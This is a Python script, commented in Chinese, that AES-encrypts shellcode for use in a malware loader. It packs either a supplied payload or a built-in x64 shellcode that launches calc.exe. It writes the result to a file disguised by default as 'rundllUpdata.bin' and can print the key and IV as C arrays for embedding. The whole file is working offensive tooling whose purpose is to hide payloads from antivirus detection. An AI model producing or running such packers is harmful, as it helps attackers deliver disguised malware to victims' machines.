#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import secrets
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_random_key():
    """生成随机的16字节密钥"""
    return secrets.token_bytes(16)

def generate_random_iv():
    """生成随机的16字节IV"""
    return secrets.token_bytes(16)

def bytes_to_c_array(data, var_name):
    hex_values = ', '.join(f'0x{b:02X}' for b in data)
    formatted_values = []
    for i in range(0, len(data), 8):
        line_values = hex_values.split(', ')[i:i + 8]
        formatted_values.append('    ' + ', '.join(line_values))

    result = f"unsigned char {var_name}[16] = {{\n"
    result += ',\n'.join(formatted_values)
    result += "\n};"
    return result

def read_shellcode_from_file(file_path):
    """从文件中读取shellcode"""
    try:
        with open(file_path, 'r') as f:
            hex_string = f.read().strip()
            # 使用 codecs.decode 或者 bytes.fromhex 来解析
            import codecs
            return codecs.decode(hex_string, 'unicode_escape').encode('latin1')
    except IOError as e:
        print(f"无法读取文件 {file_path}: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='AES加密工具 - 支持随机密钥生成和文件输入')
    parser.add_argument('-r', '--random', action='store_true',
                        help='使用随机生成的密钥和IV')
    parser.add_argument('-o', '--output', default='rundllUpdata.bin',
                        help='指定输出文件名 (默认: rundllUpdata.bin)')
    parser.add_argument('-i', '--input',
                        help='包含shellcode的输入文件')

    args = parser.parse_args()

    # 默认密钥和IV
    default_key = "2F8A15C4679B3ED2548FA17CE9056DB8"
    default_iv = "917E4A23F65C8D1B37E29408AF6BC540"

    # 默认的calc.exe shellcode
    DEFAULT_SHELLCODE = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    # 获取shellcode
    if args.input:
        shellcode = read_shellcode_from_file(args.input)
        print("-------------------------- 成功读取shellcode --------------------------")
    else:
        shellcode = DEFAULT_SHELLCODE
        print("-------------------------- 使用默认的calc shellcode --------------------------")

    if args.random:
        key_bytes = generate_random_key()
        iv_bytes = generate_random_iv()

        print("-------------------------- 随机密钥已生成！--------------------------")
        print("=" * 60)
        print("// AES 密钥")
        print(bytes_to_c_array(key_bytes, "AES_KEY"))
        print()
        print("// AES IV")
        print(bytes_to_c_array(iv_bytes, "AES_IV"))
        print("=" * 60)
    else:
        key_bytes = bytes.fromhex(default_key)
        iv_bytes = bytes.fromhex(default_iv)
        print(f"-------------------------- 使用默认密钥进行加密... --------------------------")

    try:
        print(f"Shellcode长度: {len(shellcode)} 字节")

        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        padded_shellcode = pad(shellcode, AES.block_size)
        ciphertext = cipher.encrypt(padded_shellcode)

        with open(args.output, "wb") as f:
            f.write(ciphertext)

        print(f"加密完成！")
        print(f"输出文件: {args.output}")
        print(f"加密后大小: {len(ciphertext)} 字节")

        if not args.random:
            print(f"\n 使用的密钥信息:")
            print(f"   KEY: {default_key}")
            print(f"   IV:  {default_iv}")

    except ValueError as e:
        print(f"错误: Shellcode格式不正确 - {e}")
        sys.exit(1)
    except Exception as e:
        print(f"加密失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()